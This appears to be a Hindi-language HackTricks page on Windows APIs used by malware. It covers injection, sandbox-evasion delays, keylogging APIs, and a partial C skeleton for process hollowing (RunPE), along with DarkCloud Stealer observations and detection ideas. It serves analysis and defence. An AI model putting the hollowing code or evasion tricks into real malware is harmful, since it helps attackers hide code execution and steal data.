# मालवेयर में उपयोग किए जाने वाले Common API

{{#include ../banners/hacktricks-training.md}}

## सामान्य

### नेटवर्किंग

| Raw Sockets   | WinAPI Sockets |
| ------------- | -------------- |
| socket()      | WSAStratup()   |
| bind()        | bind()         |
| listen()      | listen()       |
| accept()      | accept()       |
| connect()     | connect()      |
| read()/recv() | recv()         |
| write()       | send()         |
| shutdown()    | WSACleanup()   |

### TLS pinning and chunked transport

कई लोडर अपने TCP स्ट्रीम को `SslStream` में रैप करते हैं और सर्वर के leaf प्रमाणपत्र को embedded copy के खिलाफ पिन करते हैं (certificate pinning)। Bot जानकारी/टास्क को compress किया जाता है (उदा., `GZip`)। जब responses किसी थ्रेशहोल्ड (~1 MB) को पार कर जाते हैं, तो डेटा को size-based heuristics से बचने और deserialisation के दौरान memory spikes घटाने के लिए छोटे chunks (उदा., 16 KB segments) में विभाजित किया जाता है।


### Persistence

| Registry         | File          | Service                      |
| ---------------- | ------------- | ---------------------------- |
| RegCreateKeyEx() | GetTempPath() | OpenSCManager                |
| RegOpenKeyEx()   | CopyFile()    | CreateService()              |
| RegSetValueEx()  | CreateFile()  | StartServiceCtrlDispatcher() |
| RegDeleteKeyEx() | WriteFile()   |                              |
| RegGetValue()    | ReadFile()    |                              |

### Encryption

| Name                  |
| --------------------- |
| WinCrypt              |
| CryptAcquireContext() |
| CryptGenKey()         |
| CryptDeriveKey()      |
| CryptDecrypt()        |
| CryptReleaseContext() |

### Anti-Analysis/VM

| Function Name                                             | Assembly Instructions |
| --------------------------------------------------------- | --------------------- |
| IsDebuggerPresent()                                       | CPUID()               |
| GetSystemInfo()                                           | IN()                  |
| GlobalMemoryStatusEx()                                    |                       |
| GetVersion()                                              |                       |
| CreateToolhelp32Snapshot \[Check if a process is running] |                       |
| CreateFileW/A \[Check if a file exist]                    |                       |

### Emulator API fingerprinting & sleep evasion

Malware अक्सर sandbox emulators को fingerprint करता है by searching for Defender’s virtualised exports (जैसा कि Malware Protection Emulator में देखा गया है)। यदि इनमें से कोई भी symbol मौजूद है (process का case-insensitive स्कैन), तो execution को 10–30 मिनट के लिए देर किया जाता है और फिर से चेक किया जाता है ताकि analysis का समय बेकार किया जा सके।

Examples of API names used as canaries:
- `MpVmp32Entry`, `MpVmp32FastEnter`, `MpCallPreEntryPointCode`, `MpCallPostEntryPointCode`, `MpFinalize`, `MpReportEvent*`, `MpSwitchToNextThread*`
- `VFS_*` family: `VFS_Open`, `VFS_Read`, `VFS_MapViewOfFile`, `VFS_UnmapViewOfFile`, `VFS_FindFirstFile/FindNextFile`, `VFS_CopyFile`, `VFS_DeleteFile`, `VFS_MoveFile`
- `ThrdMgr_*`: `ThrdMgr_GetCurrentThreadHandle`, `ThrdMgr_SaveTEB`, `ThrdMgr_SwitchThreads`

Typical delay primitive (user-land):
```cmd
cmd /c timeout /t %RANDOM_IN_[600,1800]% > nul
```
Argument gatekeeping
- ऑपरेटर कभी-कभी payload चलाने से पहले एक benign-देखने वाला CLI switch मौजूद होने की आवश्यकता रखते हैं (e.g., `/i:--type=renderer` ताकि Chromium child processes का नकल किया जा सके). अगर switch अनुपस्थित है, तो loader तुरंत exit कर देता है, जिससे naive sandbox निष्पादन बाधित होता है।


### Stealth

| नाम                     |                                                                            |
| ------------------------ | -------------------------------------------------------------------------- |
| VirtualAlloc             | मेमोरी आवंटित करें (packers)                                               |
| VirtualProtect           | मेमोरी अनुमतियाँ बदलें (packer द्वारा किसी सेक्शन को execution permission देना) |
| ReadProcessMemory        | बाहरी प्रोसेस में injection                                                  |
| WriteProcessMemoryA/W    | बाहरी प्रोसेस में injection                                                  |
| NtWriteVirtualMemory     |                                                                            |
| CreateRemoteThread       | DLL/Process injection...                                                   |
| NtUnmapViewOfSection     |                                                                            |
| QueueUserAPC             |                                                                            |
| CreateProcessInternalA/W |                                                                            |

### Execution

| फ़ंक्शन नाम    |
| ---------------- |
| CreateProcessA/W |
| ShellExecute     |
| WinExec          |
| ResumeThread     |
| NtResumeThread   |

### Miscellaneous

- GetAsyncKeyState() -- Key logging
- SetWindowsHookEx -- Key logging
- GetForeGroundWindow -- चल रही विंडो का नाम प्राप्त करें (या ब्राउज़र से वेबसाइट)
- LoadLibrary() -- लाइब्रेरी इम्पोर्ट करें
- GetProcAddress() -- लाइब्रेरी इम्पोर्ट करें
- CreateToolhelp32Snapshot() -- चल रहे प्रोसेस की सूची प्राप्त करें
- GetDC() -- स्क्रीनशॉट
- BitBlt() -- स्क्रीनशॉट
- InternetOpen(), InternetOpenUrl(), InternetReadFile(), InternetWriteFile() -- इंटरनेट एक्सेस
- FindResource(), LoadResource(), LockResource() -- executable के resources तक पहुँच

## Malware Techniques

### DLL Injection

Execute an arbitrary DLL inside another process

1. मैलिशियस DLL इंजेक्ट करने के लिए लक्ष्य प्रोसेस ढूंढें: CreateToolhelp32Snapshot, Process32First, Process32Next
2. प्रोसेस खोलें: GetModuleHandle, GetProcAddress, OpenProcess
3. प्रोसेस के अंदर DLL का path लिखें: VirtualAllocEx, WriteProcessMemory
4. उस प्रोसेस में एक थ्रेड बनाएं जो मैलिशियस DLL को लोड करेगा: CreateRemoteThread, LoadLibrary

अन्य उपयोगी फंक्शन्स: NTCreateThreadEx, RtlCreateUserThread

### Reflective DLL Injection

Windows API के सामान्य कॉल्स को कॉल किए बिना एक मैलिशियस DLL लोड करना।\
DLL को किसी प्रोसेस के अंदर map किया जाता है, यह import addresses को resolve करेगा, relocations को ठीक करेगा और DllMain फ़ंक्शन को कॉल करेगा।

### Thread Hijacking

किसी प्रोसेस की एक थ्रेड ढूंढें और उसे मैलिशियस DLL लोड करने के लिए मजबूर करें

1. लक्ष्य थ्रेड खोजें: CreateToolhelp32Snapshot, Thread32First, Thread32Next
2. थ्रेड खोलें: OpenThread
3. थ्रेड को suspend करें: SuspendThread
4. विक्टिम प्रोसेस के अंदर मैलिशियस DLL का path लिखें: VirtualAllocEx, WriteProcessMemory
5. थ्रेड को resume करें ताकि यह लाइब्रेरी लोड करे: ResumeThread

### PE Injection

Portable Execution Injection: executable विक्टिम प्रोसेस की memory में लिखा जाएगा और वहीं से execute किया जाएगा।

### Process Hollowing (a.k.a **RunPE**)

`Process Hollowing` Windows मालवेयर द्वारा उपयोग की जाने वाली पसंदीदा **defence-evasion / execution** ट्रिक्स में से एक है। विचार यह है कि एक legitimate प्रोसेस को **suspended** स्टेट में लॉन्च किया जाए, उसकी मूल image को memory से हटाया (hollow) जाए और उसकी जगह एक **arbitrary PE** कॉपी किया जाए। जब primary thread अंततः resume होता है तो malicious entry-point एक trusted binary के रूप में (अक्सर Microsoft द्वारा signed) execute होता है।

आम कार्यप्रवाह:

1. एक benign host spawn करें (e.g. `RegAsm.exe`, `rundll32.exe`, `msbuild.exe`) **suspended** ताकि अभी कोई instruction न चले।
```c
STARTUPINFOA  si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\Microsoft.NET\\Framework32\\v4.0.30319\\RegAsm.exe",
NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```
2. मैलिशियस payload को memory में पढ़ें और उसके PE headers parse करके `SizeOfImage`, sections और नया `EntryPoint` प्राप्त करें।
3. **NtUnmapViewOfSection** / **ZwUnmapViewOfSection** – suspended प्रोसेस के original image base को unmap करें।
4. **VirtualAllocEx** – remote प्रोसेस के अंदर `SizeOfImage` का RWX मेमोरी reserve करें।
5. **WriteProcessMemory** – पहले `Headers` कॉपी करें, फिर sections पर iterate करते हुए उनकी raw data कॉपी करें।
6. **SetThreadContext** – context structure में `EAX/RAX` (`RCX` on x64) या `Rip` के मान को पैच करें ताकि `EIP` payload के `EntryPoint` की ओर इशारा करे।
7. **ResumeThread** – थ्रेड जारी रहता है और हमलावर द्वारा प्रदान किया गया कोड execute होता है।

Minimal proof-of-concept (x86) skeleton:
```c
void RunPE(LPCSTR host, LPVOID payload, DWORD payloadSize){
// 1. create suspended process
STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
CreateProcessA(host, NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi);

// 2. read remote PEB to get ImageBaseAddress
CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread,&ctx);
PVOID baseAddr;
ReadProcessMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&baseAddr,4,NULL);

// 3. unmap original image & allocate new region at same base
NtUnmapViewOfSection(pi.hProcess,baseAddr);
PVOID newBase = VirtualAllocEx(pi.hProcess,baseAddr,pHdr->OptionalHeader.SizeOfImage,
MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
// 4-5. copy headers & sections …
// 6. write new image base into PEB and set Eip
WriteProcessMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&baseAddr,4,NULL);
ctx.Eax = (DWORD)(newBase) + pHdr->OptionalHeader.AddressOfEntryPoint;
SetThreadContext(pi.hThread,&ctx);
// 7. run!
ResumeThread(pi.hThread);
}
```
व्यावहारिक टिप्पणियाँ जो **DarkCloud Stealer** कैंपेन में देखी गईं:

* लॉडर ने `RegAsm.exe` (.NET Framework का हिस्सा) को host के रूप में चुना – एक signed binary जो ध्यान आकर्षित होने की संभावना कम रखता है।
* डिक्रिप्टेड VB6 stealer (`holographies.exe`) डिस्क पर *ड्रॉप* नहीं किया जाता; यह केवल hollowed process के अंदर मौजूद रहता है, जिससे static detection कठिन हो जाती है।
* संवेदनशील स्ट्रिंग्स (regexes, paths, Telegram credentials) प्रति-स्ट्रिंग **RC4-encrypted** हैं और केवल runtime पर डिक्रिप्ट होती हैं, जिससे memory scanning और जटिल हो जाता है।

Detection ideas:
* ऐसे `CREATE_SUSPENDED` प्रोसेसेस पर अलर्ट करें जो GUI/console विंडो कभी नहीं बनाते और फिर एक memory region को **RWX** के रूप में allocate किया जाता है (benign कोड के लिए यह दुर्लभ है)।
* विभिन्न प्रोसेसेस में कॉल सीक्वेंस `NtUnmapViewOfSection ➜ VirtualAllocEx ➜ WriteProcessMemory` की तलाश करें।



## Hooking

- The **SSDT** (**System Service Descriptor Table**) kernel functions (ntoskrnl.exe) या GUI driver (win32k.sys) की ओर पॉइंट करता है ताकि user processes इन फ़ंक्शन्स को कॉल कर सकें।
- एक rootkit इन pointers को उन एड्रेसेस पर संशोधित कर सकता है जिन्हें वह नियंत्रित करता है
- **IRP** (**I/O Request Packets**) एक कंपोनेंट से दूसरे को डेटा के टुकड़े ट्रांसमिट करते हैं। kernel में लगभग हर चीज IRPs उपयोग करती है और प्रत्येक device object का अपना function table होता है जिसे hook किया जा सकता है: DKOM (Direct Kernel Object Manipulation)
- The **IAT** (**Import Address Table**) dependencies को resolve करने के काम आता है। इस table को hook करना संभव है ताकि कॉल होने वाले कोड को hijack किया जा सके।
- **EAT** (**Export Address Table**) Hooks। ये hooks **userland** से किए जा सकते हैं। लक्ष्य DLLs द्वारा exported functions को hook करना है।
- **Inline Hooks**: यह प्रकार हासिल करना कठिन है। इसमें स्वयं फ़ंक्शन्स के कोड में संशोधन शामिल होता है। संभवतः शुरुआत में एक jump डालकर।


## संदर्भ

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
